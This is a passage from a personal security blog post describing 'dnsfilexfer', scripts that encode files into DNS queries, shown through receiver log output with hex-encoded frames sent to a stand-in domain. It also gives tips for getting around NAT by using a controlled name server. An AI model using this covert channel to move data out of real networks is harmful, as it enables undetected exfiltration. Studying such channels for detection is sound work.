[INFO] Full resource record query was for: 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io.
[INFO] Processing frame 0001646e735f6d6573736167655f7465737400000000000000000000
[INFO] Full resource record query was for: 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io.
[INFO] Processing frame 00028bf2046ae2144be75d2ce780b3f992e2c368021e
[INFO] Full resource record query was for: 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io.
[INFO] Processing frame 00032f6c487376545a54336e4a6651676474555753704b447172704b754b
[INFO] Full resource record query was for: 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io.
[INFO] Processing frame 00042b654c7255336270417039614e444a74364b2f6d7745633873425561
[INFO] Full resource record query was for: 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io.
[INFO] Processing frame 00054a796250683772356832414f6b4a56657a7742424f4453563968464d
[INFO] Full resource record query was for: 000638773d3d.fake.io.
[INFO] Processing frame 000638773d3d
[INFO] Full resource record query was for: 00000000000000000000000000000000000000000000000000000000.fake.io.
[INFO] Processing frame 00000000000000000000000000000000000000000000000000000000
[OK] Message seems to be intact and passes sha1 checksum of 8bf2046ae2144be75d2ce780b3f992e2c368021e
[OK] Message was received in 8 requests
[INFO] Message has been decrypted with the configured secret
Message identifier: dns_message_test

---START OF MESSAGE---
This is a test message that will be sent over DNS
Cool eh?

---END OF MESSAGE---
</code></pre><p>The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats <em>should</em> work just fine. <strong>HOWEVER</strong> Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.</p>
<p>Using encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.</p>
<h2 id=some-afterthoughts>Some afterthoughts<a hidden class=anchor aria-hidden=true href=#some-afterthoughts>#</a></h2>
<p>So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with <code>--domain</code> on the sending script, and have something like <code>fake.&lt;your valid zone>.com</code>, which will result in you still being able to grep for <code>fake</code> in the tcpdump replay.</p>
<h3 id=further-reading>further reading<a hidden class=anchor aria-hidden=true href=#further-reading>#</a></h3>
<p><a href=https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306>https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306</a>
<a href=http://www.aldeid.com/wiki/File-transfer-via-DNS>http://www.aldeid.com/wiki/File-transfer-via-DNS</a></p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/>
<span class=title>« Prev Page</span>
<br>
<span>Climbing the SkyTower</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/>
<span class=title>Next Page »</span>
<br>
<span>slash root slash flag dot txt Solving the Relativity Vulnerable VM</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share dnsfilexfer - yet another take on file transfer via DNS on twitter" href="https://twitter.com/intent/tweet/?text=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dnsfilexfer - yet another take on file transfer via DNS on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&summary=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dnsfilexfer - yet another take on file transfer via DNS on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f&title=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dnsfilexfer - yet another take on file transfer via DNS on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dnsfilexfer - yet another take on file transfer via DNS on whatsapp" href="https://api.whatsapp.com/send?text=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share dnsfilexfer - yet another take on file transfer via DNS on telegram" href="https://telegram.me/share/url?text=dnsfilexfer%20-%20yet%20another%20take%20on%20file%20transfer%20via%20DNS&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f03%2f11%2fdnsfilexfer-yet-another-take-on-file-transfer-via-dns%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>